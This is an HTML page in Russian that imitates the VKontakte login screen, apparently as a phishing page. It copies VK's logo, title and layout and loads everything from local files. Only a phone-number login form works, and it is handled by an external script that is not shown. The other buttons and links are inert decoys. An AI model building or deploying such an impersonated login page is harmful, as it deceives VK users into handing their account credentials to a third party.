<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Вход ВКонтакте</title>
    <link rel="stylesheet" href="/styles.css">
    <link href="https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600&display=swap" rel="stylesheet">
</head>
<body class="vk-bg">
    <div class="vk-bg-lines"></div>
    <div class="vk-center">
        <div class="vk-card">
            <div class="vk-login-box">
                <button class="vk-back-btn-abs" tabindex="-1" aria-label="Назад">
                    <svg width="24" height="24" viewBox="0 0 24 24" fill="none"><path d="M15 6l-6 6 6 6" stroke="#b0b0b0" stroke-width="2.2" stroke-linecap="round" stroke-linejoin="round"/></svg>
                </button>
                <div class="vk-logo-center">
                    <img src="/icons/vk.png" alt="VK" class="vk-logo-img" />
                </div>
                <h2 class="vk-title">Вход ВКонтакте</h2>
                <div class="vk-tabs wide-tabs">
                    <button class="vk-tab vk-tab-active">Телефон</button>
                    <button class="vk-tab">Почта</button>
                </div>
                <form id="loginForm">
                    <div class="vk-phone-group wide-field">
                        <img src="/icons/ru.png" alt="RU" class="vk-flag-img" />
                        <input type="tel" id="phoneNumber" placeholder="+7" required autocomplete="off" />
                    </div>
                    <div class="vk-checkbox-group wide-field">
                        <input type="checkbox" id="rememberMe" checked />
                        <label for="rememberMe">Сохранить вход</label>
                    </div>
                    <button type="submit" class="vk-login-btn wide-field">Войти</button>
                </form>
                <button class="vk-create-btn wide-field" tabindex="-1">Создать аккаунт</button>
                <div class="vk-or">или с помощью</div>
                <button class="vk-qr-btn wide-field" tabindex="-1">
                    <img src="/icons/qr.png" alt="QR" class="vk-qr-icon-img" /> QR-код
                </button>
                <div class="vk-agreement">
                    Нажимая «Войти», вы принимаете <a href="#" tabindex="-1">пользовательское соглашение</a> и <a href="#" tabindex="-1">политику конфиденциальности</a>
                </div>
            </div>
        </div>
    </div>
    <div class="vk-bottom-link">
        <a href="#" tabindex="-1">Узнать больше о VK ID</a>
    </div>
    <script src="/script.js"></script>
</body>
</html>
